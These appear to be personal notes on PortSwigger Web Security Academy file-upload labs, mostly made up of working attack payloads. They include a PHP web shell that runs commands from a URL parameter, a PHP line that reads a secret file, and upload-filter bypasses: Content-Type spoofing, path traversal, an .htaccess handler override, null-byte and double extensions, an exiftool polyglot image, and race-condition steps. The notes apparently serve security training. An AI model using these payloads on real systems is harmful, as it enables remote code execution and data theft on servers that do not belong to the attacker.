`<?php echo system($_GET['command']); ?>`
#### Web shell upload via Content-Type restriction bypass
1. Content-Disposition: form-data; name="avatar"; filename="img4.php"
        Content-Type: image/png
        **Sometimes Works**
#### Web shell upload via path traversal

`<?php echo file_get_contents('/home/carlos/secret'); ?>`
`%2e%2e%2fshell.php`
#### Web shell upload via extension blacklist bypass
1. .htaccess:
```php
   AddHandler application/x-httpd-php .html .php
```
2. upload shell.html after uploading .htaccess
#### Web shell upload via obfuscated file extension
works
```php
Content-Disposition: form-data; name="avatar"; filename="shell.php%00.jpg"
Content-Type: application/x-php
=================================================================================
Content-Disposition: form-data; name="avatar"; filename="shell.php.jpg"
Content-Type: application/x-php
=================================================================================
```

#### Remote code execution via polyglot web shell upload
```bash
exiftool -Comment='<?php echo system($_GET['command']); ?>' ~/Downloads/876t.jpg -o portswigger.php
```
#### File upload race conditions
Some websites upload the file ==directly to the main filesystem== and then remove it again if it ==doesn't pass validation==. This kind of behavior is typical in websites that rely on anti-virus software and the like to check for malware. This may only take a few milliseconds, but for the ==short time that the file exists== on the server, the attacker can potentially still ==execute== it

1 - upload valid image and get it's endpoint
https://0ad300bc0428e31284334ba0005e00da.web-security-academy.net/files/avatars/Hot_Babe.png

2 - upload php shell and get 403

3 - craft request to get original valid image from step 1
```php
GET /files/avatars/Hot_Babe.png HTTP/2
Host: 0ad300bc0428e31284334ba0005e00da.web-security-academy.net
```
4 - copy to repeater and create 10 requests from step 2 (upload shell)

5 - copy to repeater and create 10 requests from step 1 (upload valid image) but replace the name of the valid image with the name of the shell being uploaded from step 1
```php
GET /files/avatars/shell.php HTTP/2
Host: 0ad300bc0428e31284334ba0005e00da.web-security-academy.net
```

